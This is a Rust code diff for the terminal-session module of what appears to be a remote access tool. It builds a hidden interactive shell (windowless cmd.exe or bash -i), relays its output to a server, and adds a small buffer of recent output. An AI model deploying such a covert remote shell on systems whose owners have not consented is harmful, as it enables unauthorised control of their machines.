@@ -1,3 +1,4 @@
+use std::collections::VecDeque;
 use std::process::Stdio;
 use std::sync::{Arc, Weak};
 
@@ -5,7 +6,10 @@ use async_trait::async_trait;
 use rat_common::framework::{Module, ModuleImpl, ModuleState};
 use rat_common::reader::Reader;
 use rat_common::schema::input::{SessionInput, SessionInputTerminalStdin};
-use rat_common::schema::output::SessionOutput;
+use rat_common::schema::output::{
+    SessionOutput, SessionOutputTerminalStderr, SessionOutputTerminalStdout,
+};
+use rat_common::schema::state::{SessionState, TerminalSessionState};
 use rat_common::schema::{
     ClientMessage, ClientMessageData, SessionMetadata, SessionMetadataInner,
     SessionMetadataInnerTerminal,
@@ -18,15 +22,33 @@ use tokio::sync::Mutex;
 use crate::client::Client;
 use crate::sessions::SessionImpl;
 
-fn default_shell() -> &'static str {
+const _MAX_BUFFER_SIZE: usize = 2048;
+
+fn _build_default_shell() -> anyhow::Result<Command> {
+    #[cfg(windows)]
+    let mut command = Command::new("cmd.exe");
+
     #[cfg(windows)]
     {
-        "cmd.exe"
+        const CREATE_NO_WINDOW: u32 = 0x08000000;
+        command.creation_flags(CREATE_NO_WINDOW);
     }
+
+    #[cfg(unix)]
+    let mut command = Command::new("/bin/bash");
+
     #[cfg(unix)]
     {
-        "/bin/bash"
+        command.arg("-i");
     }
+
+    command
+        .stdin(Stdio::piped())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .kill_on_drop(true);
+
+    Ok(command)
 }
 
 pub struct TerminalSession {
@@ -37,24 +59,14 @@ pub struct TerminalSession {
     _input: Mutex<ChildStdin>,
     _output: Mutex<(Reader<ChildStdout>, Reader<ChildStderr>)>,
     _state: Arc<ModuleState>,
+    _buffer: Mutex<VecDeque<u8>>,
 }
 
 impl TerminalSession {
     pub async fn new(client: Weak<Client>) -> anyhow::Result<Self> {
-        let mut command = Command::new(default_shell());
-        command
-            .stdin(Stdio::piped())
-            .stdout(Stdio::piped())
-            .stderr(Stdio::piped())
-            .kill_on_drop(true);
-
-        #[cfg(windows)]
-        {
-            const CREATE_NO_WINDOW: u32 = 0x08000000;
-            command.creation_flags(CREATE_NO_WINDOW);
-        }
-
+        let mut command = _build_default_shell()?;
         let mut process = command.spawn()?;
+
         let stdin = process
             .stdin
             .take()
@@ -83,6 +95,7 @@ impl TerminalSession {
             _input: Mutex::new(stdin),
             _output: Mutex::new((Reader::new(stdout), Reader::new(stderr))),
             _state: ModuleState::new(),
+            _buffer: Mutex::new(VecDeque::new()),
         })
     }
 }
@@ -123,9 +136,29 @@ impl ModuleImpl for TerminalSession {
 
     async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
         if let Some(client) = self._client.upgrade() {
-            if let SessionOutput::TerminalClosed(_) = event {
-                // Do not early return here, as we still want to send the closed message to the server
-                self.stop();
+            match &event {
+                SessionOutput::TerminalClosed(_) => {
+                    // Do not early return here, as we still want to send the closed message to the server
+                    self.stop();
+                }
+                SessionOutput::TerminalStdout(SessionOutputTerminalStdout { data })
+                | SessionOutput::TerminalStderr(SessionOutputTerminalStderr { data }) => {
+                    let mut slice = data.as_bytes();
+                    let offset = slice.len().saturating_sub(_MAX_BUFFER_SIZE);
+                    slice = &slice[offset..];
+
+                    let mut buffer = self._buffer.lock().await;
+
+                    let excess = buffer
+                        .len()
+                        .saturating_add(slice.len())
+                        .saturating_sub(_MAX_BUFFER_SIZE);
+                    if excess > 0 {
+                        buffer.drain(..excess);
+                    }
+
+                    buffer.extend(slice);
+                }
             }
 
             let message = ClientMessage {
@@ -160,5 +193,14 @@ impl SessionImpl for TerminalSession {
         }
 
         Ok(())
+    }
+
+    async fn query_current_state(&self) -> anyhow::Result<SessionState> {
+        let mut buffer = self._buffer.lock().await;
+        let slice = buffer.make_contiguous();
+
+        Ok(SessionState::Terminal(TerminalSessionState {
+            data: String::from_utf8_lossy(slice).to_string(),
+        }))
     }
 }
